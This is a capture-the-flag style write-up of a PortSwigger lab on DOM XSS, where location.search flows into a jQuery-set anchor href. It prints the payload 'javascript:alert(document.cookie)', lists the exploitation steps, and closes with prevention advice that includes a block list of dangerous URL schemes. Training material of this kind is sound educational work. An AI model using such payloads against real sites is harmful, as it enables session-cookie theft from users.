# 🚨 Lab 23 — DOM XSS in jQuery Anchor `href` Attribute Sink using `location.search`

## 🧪 Lab Details

| Field | Value |
|---|---|
| **Lab No** | 23 |
| **Lab Name** | DOM XSS in jQuery anchor `href` attribute sink using `location.search` source |
| **Category** | DOM XSS |
| **Platform** | PortSwigger Web Security Academy |

---

# 🎯 Goal

Inject a `javascript:` URL that executes JavaScript when clicked.

---

# 🔍 Injection Point

- URL Search Parameter

---

# 🧠 Vulnerability Overview

The application reads attacker-controlled input from:

```javascript
location.search
```

and inserts it into an anchor tag:

```javascript
href
```

using jQuery.

---

# 💣 Payload

```javascript
javascript:alert(document.cookie)
```

---

# ⚔️ Exploitation Steps

## 1️⃣ Open the Vulnerable Page

Navigate to the page containing the vulnerable link.

---

## 2️⃣ Inject Payload into URL

```javascript
javascript:alert(document.cookie)
```

---

## 3️⃣ Payload Becomes Anchor URL

Example:

```html
<a href="javascript:alert(document.cookie)">
```

---

## 4️⃣ Click the Link

The browser interprets the `javascript:` scheme and executes JavaScript.

✅ DOM XSS Successfully Triggered

---

# 🧨 Why It Works

Normally:

```html
href="https://example.com"
```

opens a webpage.

But:

```html
href="javascript:alert(1)"
```

executes JavaScript directly in the browser.

---

# 🛡️ Prevention

## ✅ Validate URL Schemes

Allow only safe protocols:

```text
https:
http:
mailto:
```

Block:

```text
javascript:
data:
vbscript:
```

---

## ✅ Sanitize User Input

Never place untrusted data directly into:

```html
href
src
action
```

attributes.

---

# 💡 Key Takeaway

The `javascript:` protocol can convert normal links into executable JavaScript.

Always validate and sanitize URL-based attributes.
